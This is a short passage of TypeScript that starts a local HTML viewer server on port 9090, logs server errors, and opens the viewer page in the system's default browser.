    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(html);
  });

  server.on("error", (err: Error) => {
    onLog(`[!] Viewer server erro: ${err.message}`);
    viewerServer = null;
  });

  server.listen(9090, () => {
    viewerServer = server;
    const url = "http://localhost:9090";
    const cmd = process.platform === "win32" ? `start ${url}`
              : process.platform === "darwin" ? `open ${url}`
              : `xdg-open ${url}`;
    exec(cmd);
  });
}
